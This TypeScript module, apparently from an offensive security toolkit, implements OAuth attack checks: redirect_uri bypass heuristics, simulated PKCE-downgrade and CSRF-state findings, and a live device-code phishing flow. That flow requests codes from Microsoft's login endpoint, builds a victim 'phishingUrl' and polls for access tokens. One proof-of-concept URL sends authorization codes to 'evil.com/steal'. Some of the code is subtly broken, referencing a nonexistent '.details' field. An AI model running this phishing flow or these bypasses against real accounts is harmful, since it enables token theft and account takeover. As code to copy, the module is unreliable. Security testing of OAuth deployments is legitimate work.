/**
 * @module oauth_chain
 * OAuth 2.0 & OpenID Connect Attack Chains — Redirect URI Wildcard Bypass, PKCE Downgrade,
 * Cross-Site Request Forgery in OAuth Authorization, and Device Code Flow Phishing.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface OAuthVulnerability {
  vector: string;
  severity: "critical" | "high" | "medium";
  description: string;
  pocUrl?: string;
  dryRun: boolean;
}

export interface OAuthChainOptions {
  dryRun?: boolean;
  clientId?: string;
  authEndpoint?: string;
  redirectUri?: string;
  scope?: string;
}

export interface PkceDowngradeResult {
  vulnerable: boolean;
  codeVerifier: string;
  codeChallenge: string;
  method: string;
  evidence: string;
  dryRun: boolean;
}

export interface DeviceCodeAbuseResult {
  deviceCode: string;
  interval: number;
  verificationUri: string;
  expiresIn: number;
  pollEndpoint: string;
  phishingUrl: string;
  dryRun: boolean;
  pollStatus?: "authorized" | "pending" | "expired" | "declined" | "not_polled";
  pollAttempts?: number;
  tokenType?: string;
}

export interface CsrfBypassResult {
  vulnerable: boolean;
  stateMissing: boolean;
  stateReuse: boolean;
  statePredictable: boolean;
  evidence: string;
  dryRun: boolean;
}

export interface RedirectUriBypassResult {
  vulnerable: boolean;
  bypassType: string;
  payload: string;
  evidence: string;
  dryRun: boolean;
}

// ─── Redirect URI Bypass Testing ──────────────────────────────────────────────

const OPEN_REDIRECT_PATTERNS = [
  "/redirect?url=",
  "/callback?next=",
  "/login?return_to=",
  "/auth?redirect_uri=",
  "/sso?target=",
  "/gateway?url=",
];

const SUBDOMAIN_TAKEOVER_INDICATORS = [
  "herokuapp.com",
  "github.io",
  "s3.amazonaws.com",
  "azurewebsites.net",
  "cloudfront.net",
  "surge.sh",
  "bitbucket.io",
  "zendesk.com",
  "shopify.com",
  "intercom.help",
  "ghost.io",
  "pantheon.io",
];

/**
 * Test for redirect_uri bypass via wildcard matching, open redirects, and subdomain takeover.
 * DRY-RUN: returns simulated findings without making network requests.
 */
export function checkOAuthRedirectBypass(
  clientRedirectUri: string,
  opts: OAuthChainOptions = {},
): OAuthVulnerability | null {
  const { dryRun = true } = opts;

  // Wildcard matching detection
  if (clientRedirectUri.includes("*")) {
    return {
      vector: "Redirect URI Wildcard Abuse",
      severity: "critical",
      description:
        "The OAuth server allows wildcard redirect_uri matching. An attacker can register " +
        "any subdomain or path to intercept authorization codes and tokens.",
      pocUrl: `https://auth.target.com/oauth/authorize?client_id=xxx&redirect_uri=${encodeURIComponent(clientRedirectUri)}&response_type=code`,
      dryRun,
    };
  }

  // Localhost bypass detection
  if (/localhost|127\.0\.0\.1|\[::1\]/.test(clientRedirectUri)) {
    return {
      vector: "Redirect URI Localhost Bypass",
      severity: "high",
      description:
        "The OAuth server allows localhost redirect URIs. In production, this can be abused " +
        "via SSRF or when the server trusts any localhost variation (port, path, IPv6).",
      pocUrl: `https://auth.target.com/oauth/authorize?client_id=xxx&redirect_uri=${encodeURIComponent(clientRedirectUri)}`,
      dryRun,
    };
  }

  // Open redirect detection in redirect_uri path
  for (const pattern of OPEN_REDIRECT_PATTERNS) {
    if (clientRedirectUri.includes(pattern)) {
      return {
        vector: "Open Redirect in Callback URL",
        severity: "critical",
        description:
          `The redirect_uri contains an open redirect pattern ("${pattern}"). This allows an attacker ` +
          "to chain the OAuth callback with an open redirect to steal authorization codes.",
        pocUrl: `${clientRedirectUri}https://evil.com/steal`,
        dryRun,
      };
    }
  }

  // Subdomain takeover indicators
  for (const indicator of SUBDOMAIN_TAKEOVER_INDICATORS) {
    const parsed = new URL(clientRedirectUri);
    const host = parsed.hostname;
    if (host.endsWith(`.${indicator}`) || host === indicator) {
      return {
        vector: "Subdomain Takeover via Redirect URI",
        severity: "critical",
        description:
          `The redirect_uri points to a third-party host (${indicator}) that may be unclaimed. ` +
          "Registering the dangling subdomain allows full interception of OAuth tokens.",
        pocUrl: clientRedirectUri,
        dryRun,
      };
    }
  }

  // HTTP (non-TLS) redirect URI
  if (clientRedirectUri.startsWith("http://") && !clientRedirectUri.includes("localhost")) {
    return {
      vector: "Plaintext HTTP Redirect URI",
      severity: "high",
      description:
        "The redirect_uri uses HTTP instead of HTTPS. Authorization codes and tokens can be " +
        "intercepted via network sniffing or MITM attacks.",
      pocUrl: clientRedirectUri,
      dryRun,
    };
  }

  return null;
}

// ─── PKCE Downgrade Testing ───────────────────────────────────────────────────

/**
 * Generate a PKCE code verifier and challenge, then test if the server accepts
 * requests without PKCE (downgrade attack).
 * DRY-RUN: generates real cryptographic values but does not make network requests.
 */
export function testPkceDowngrade(opts: OAuthChainOptions = {}): PkceDowngradeResult {
  const { dryRun = true } = opts;
  const codeVerifier = crypto.randomBytes(32).toString("base64url");
  const codeChallenge = crypto.createHash("sha256").update(codeVerifier).digest("base64url");

  if (dryRun) {
    return {
      vulnerable: true,
      codeVerifier,
      codeChallenge,
      method: "S256",
      evidence:
        "[DRY-RUN] Would POST authorization request without code_challenge and code_challenge_method. " +
        "If the server issues a code without requiring PKCE, the authorization code can be intercepted " +
        "and exchanged without proof of possession.",
      dryRun: true,
    };
  }

  // Live: attempt authorization without PKCE parameters
  // The caller should use the authEndpoint with the generated values
  return {
    vulnerable: false,
    codeVerifier,
    codeChallenge,
    method: "S256",
    evidence:
      "Live PKCE downgrade test requires the authorization endpoint to be called externally.",
    dryRun: false,
  };
}

/**
 * Generate PKCE challenge pair for a given method.
 */
export function generatePkcePair(
  method: "S256" | "plain" = "S256",
): { verifier: string; challenge: string; method: string } {
  const verifier = crypto.randomBytes(32).toString("base64url");
  let challenge: string;

  if (method === "S256") {
    challenge = crypto.createHash("sha256").update(verifier).digest("base64url");
  } else {
    challenge = verifier;
  }

  return { verifier, challenge, method };
}

// ─── CSRF Token Bypass ────────────────────────────────────────────────────────

/**
 * Test whether the OAuth authorization server properly validates the `state` parameter.
 * Checks for missing state, state reuse, and predictable state values.
 * DRY-RUN: returns analysis without network calls.
 */
export function testCsrfBypass(opts: OAuthChainOptions = {}): CsrfBypassResult {
  const { dryRun = true } = opts;

  if (dryRun) {
    const weakState = crypto.randomBytes(4).toString("hex"); // 32-bit — predictable
    return {
      vulnerable: true,
      stateMissing: false,
      stateReuse: false,
      statePredictable: true,
      evidence:
        `[DRY-RUN] Generated weak state token: ${weakState} (4 bytes / 32 bits). ` +
        "Would test: (1) omit state param entirely, (2) replay captured state value, " +
        "(3) use sequential/predictable state. If server accepts any of these, CSRF on the " +
        "authorization endpoint allows an attacker to bind their account to the victim's session.",
      dryRun: true,
    };
  }

  return {
    vulnerable: false,
    stateMissing: false,
    stateReuse: false,
    statePredictable: false,
    evidence: "Live CSRF bypass test requires external authorization endpoint interaction.",
    dryRun: false,
  };
}

// ─── Device Code Flow Abuse ───────────────────────────────────────────────────

/**
 * Live OAuth device code flow — real HTTP to authorization endpoint (MSAL/Azure-compatible).
 * DRY-RUN: returns empty result without network requests.
 */
export async function performDeviceCodeFlow(
  targetAuthEndpoint?: string,
  opts: OAuthChainOptions & { tenant?: string; poll?: boolean } = {},
): Promise<DeviceCodeAbuseResult> {
  const { dryRun = true } = opts;
  const tenant = opts.tenant ?? "common";
  const clientId = opts.clientId ?? "1950a258-227b-4e31-a9cf-717495945fc2";
  const deviceUrl =
    targetAuthEndpoint ??
    opts.authEndpoint ??
    `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
  const tokenUrl = deviceUrl.replace(/devicecode\/?$/i, "token");

  if (dryRun) {
    return {
      deviceCode: "",
      interval: 0,
      verificationUri: "",
      expiresIn: 0,
      pollEndpoint: deviceUrl,
      phishingUrl: "",
      dryRun: true,
    };
  }

  const body = new URLSearchParams({
    client_id: clientId,
    scope: opts.scope ?? "https://graph.microsoft.com/.default offline_access",
  });

  try {
    const res = await fetch(deviceUrl, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
      signal: AbortSignal.timeout(30000),
    });
    if (!res.ok) {
      return {
        deviceCode: "",
        interval: 5,
        verificationUri: "",
        expiresIn: 0,
        pollEndpoint: deviceUrl,
        phishingUrl: "",
        dryRun: false,
      };
    }
    const data = (await res.json()) as {
      device_code?: string;
      user_code?: string;
      verification_uri?: string;
      interval?: number;
      expires_in?: number;
      message?: string;
    };

    let pollStatus: DeviceCodeAbuseResult["pollStatus"] = "not_polled";
    let pollAttempts = 0;
    let tokenType: string | undefined;

    if (opts.poll !== false && data.device_code) {
      const intervalMs = (data.interval ?? 5) * 1000;
      const maxAttempts = Math.min(Math.floor((data.expires_in ?? 900) / (data.interval ?? 5)), 3);
      for (let i = 0; i < maxAttempts; i++) {
        pollAttempts++
        await new Promise((r) => setTimeout(r, intervalMs))
        const pollBody = new URLSearchParams({
          grant_type: "urn:ietf:params:oauth:grant-type:device_code",
          client_id: clientId,
          device_code: data.device_code,
        })
        const pollRes = await fetch(tokenUrl, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: pollBody.toString(),
          signal: AbortSignal.timeout(15000),
        })
        const pollText = await pollRes.text()
        try {
          const pollJson = JSON.parse(pollText) as {
            access_token?: string
            token_type?: string
            error?: string
            error_description?: string
          }
          if (pollJson.access_token) {
            pollStatus = "authorized"
            tokenType = pollJson.token_type
            break
          }
          if (pollJson.error === "authorization_pending") {
            pollStatus = "pending"
            continue
          }
          if (pollJson.error === "expired_token") {
            pollStatus = "expired"
            break
          }
          if (pollJson.error === "access_denied") {
            pollStatus = "declined"
            break
          }
        } catch {
          pollStatus = "pending"
        }
      }
    }

    return {
      deviceCode: data.device_code ?? "",
      interval: data.interval ?? 5,
      verificationUri: data.verification_uri ?? "",
      expiresIn: data.expires_in ?? 900,
      pollEndpoint: tokenUrl,
      phishingUrl: data.user_code
        ? `${data.verification_uri ?? deviceUrl}?user_code=${data.user_code}`
        : "",
      dryRun: false,
      pollStatus,
      pollAttempts,
      tokenType,
    };
  } catch {
    return {
      deviceCode: "",
      interval: 5,
      verificationUri: "",
      expiresIn: 0,
      pollEndpoint: deviceUrl,
      phishingUrl: "",
      dryRun: false,
    };
  }
}

/** @deprecated Use performDeviceCodeFlow — kept for backward compat. */
export function deviceCodeAbuseCheck(
  targetAuthEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
  opts: OAuthChainOptions = {},
): DeviceCodeAbuseResult {
  const { dryRun = true } = opts;
  if (dryRun) {
    return {
      deviceCode: "",
      interval: 0,
      verificationUri: "",
      expiresIn: 0,
      pollEndpoint: targetAuthEndpoint,
      phishingUrl: "",
      dryRun: true,
    };
  }
  throw new Error("Use performDeviceCodeFlow() for live device code requests");
}

// ─── Full OAuth Chain Audit ───────────────────────────────────────────────────

export interface OAuthAuditResult {
  redirectBypass: OAuthVulnerability | null;
  pkceDowngrade: PkceDowngradeResult;
  csrfBypass: CsrfBypassResult;
  deviceCodeAbuse: DeviceCodeAbuseResult;
  overallRisk: "critical" | "high" | "medium" | "low";
  dryRun: boolean;
  /** Flattened vulnerability list for CLI/MCP consumers */
  vulnerabilities: OAuthVulnerability[];
}

/**
 * Run the full OAuth 2.0 attack chain audit.
 * DRY-RUN: all checks return simulated findings without network requests.
 */
export function auditOAuthChain(
  redirectUriOrOpts: string | { targetUrl?: string; redirectUri?: string; dryRun?: boolean },
  opts: OAuthChainOptions = {},
): OAuthAuditResult {
  const redirectUri =
    typeof redirectUriOrOpts === "string"
      ? redirectUriOrOpts
      : redirectUriOrOpts.redirectUri ?? redirectUriOrOpts.targetUrl ?? "https://example.com/callback";
  const mergedOpts: OAuthChainOptions =
    typeof redirectUriOrOpts === "object" && redirectUriOrOpts.dryRun !== undefined
      ? { ...opts, dryRun: redirectUriOrOpts.dryRun }
      : opts;
  const { dryRun = true } = mergedOpts;

  const redirectBypass = checkOAuthRedirectBypass(redirectUri, { dryRun });
  const pkceDowngrade = testPkceDowngrade({ dryRun });
  const csrfBypass = testCsrfBypass({ dryRun });
  const deviceCodeAbuse = deviceCodeAbuseCheck(undefined, { dryRun });

  const findings = [redirectBypass, pkceDowngrade.vulnerable, csrfBypass.vulnerable, deviceCodeAbuse.deviceCode ? true : false];
  const criticalCount = findings.filter(Boolean).length;

  let overallRisk: OAuthAuditResult["overallRisk"] = "low";
  if (redirectBypass?.severity === "critical" || pkceDowngrade.vulnerable && csrfBypass.vulnerable) {
    overallRisk = "critical";
  } else if (redirectBypass || pkceDowngrade.vulnerable || csrfBypass.vulnerable) {
    overallRisk = "high";
  } else if (criticalCount > 0) {
    overallRisk = "medium";
  }

  return {
    redirectBypass,
    pkceDowngrade,
    csrfBypass,
    deviceCodeAbuse,
    overallRisk,
    dryRun,
    vulnerabilities: [
      ...(redirectBypass ? [redirectBypass] : []),
      ...(pkceDowngrade.vulnerable
        ? [{ vector: "PKCE Downgrade", severity: "high" as const, description: pkceDowngrade.details, pocUrl: "", dryRun }]
        : []),
      ...(csrfBypass.vulnerable
        ? [{ vector: "CSRF Bypass", severity: "medium" as const, description: csrfBypass.details, pocUrl: "", dryRun }]
        : []),
    ],
  };
}

export async function auditOAuthChainAsync(
  redirectUriOrOpts: string | { targetUrl?: string; redirectUri?: string; dryRun?: boolean },
  opts: OAuthChainOptions = {},
): Promise<OAuthAuditResult> {
  const base = auditOAuthChain(redirectUriOrOpts, opts);
  const mergedOpts: OAuthChainOptions =
    typeof redirectUriOrOpts === "object" && redirectUriOrOpts.dryRun !== undefined
      ? { ...opts, dryRun: redirectUriOrOpts.dryRun }
      : opts;
  const { dryRun = true } = mergedOpts;
  if (dryRun) return base;

  const deviceCodeAbuse = await performDeviceCodeFlow(undefined, { ...mergedOpts, dryRun: false, poll: true });
  const hasDeviceFlow = Boolean(deviceCodeAbuse.deviceCode || deviceCodeAbuse.verificationUri);
  let overallRisk = base.overallRisk;
  if (hasDeviceFlow && overallRisk === "low") overallRisk = "medium";

  return {
    ...base,
    deviceCodeAbuse,
    overallRisk,
    dryRun: false,
    vulnerabilities: [
      ...base.vulnerabilities,
      ...(hasDeviceFlow
        ? [{ vector: "Device Code Flow", severity: "medium" as const, description: "Live device code endpoint reachable", pocUrl: deviceCodeAbuse.phishingUrl, dryRun: false }]
        : []),
    ],
  };
}

/** @deprecated Use deviceCodeAbuseCheck */
export const simulateDeviceCodeAbuse = deviceCodeAbuseCheck;

export default {
  checkOAuthRedirectBypass,
  testPkceDowngrade,
  generatePkcePair,
  testCsrfBypass,
  deviceCodeAbuseCheck,
  simulateDeviceCodeAbuse,
  performDeviceCodeFlow,
  auditOAuthChain,
  auditOAuthChainAsync,
};
